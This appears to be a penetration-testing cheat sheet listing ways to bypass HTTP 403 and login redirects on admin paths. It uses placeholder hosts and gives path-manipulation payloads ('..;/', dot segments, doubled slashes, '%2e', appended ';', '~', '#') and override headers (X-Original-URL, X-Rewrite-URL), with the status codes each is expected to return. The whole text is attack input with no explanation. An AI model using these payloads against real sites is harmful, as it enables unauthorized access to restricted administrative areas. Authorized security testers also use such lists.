	https://target.com/admin/ –> HTTP 302 (redirect to login page)
	https://target.com/admin..;/ –> HTTP 200 OK

	https://target.com/../admin
	https://target.com/whatever/..;/admin

	site.com/secret –> HTTP 403 Forbidden
	site.com/secret/ –> HTTP 200 OK
	site.com/secret/. –> HTTP 200 OK
	site.com//secret// –> HTTP 200 OK
	site.com/./secret/.. –> HTTP 200 OK

	X-Original-URL: /admin
	X-Override-URL: /admin
	X-Rewrite-URL: /admin

	/accessible/..;/admin
	/.;/admin
	/admin;/
	/admin/~
	/./admin/./
	/admin?param
	/%2e/admin
	/admin#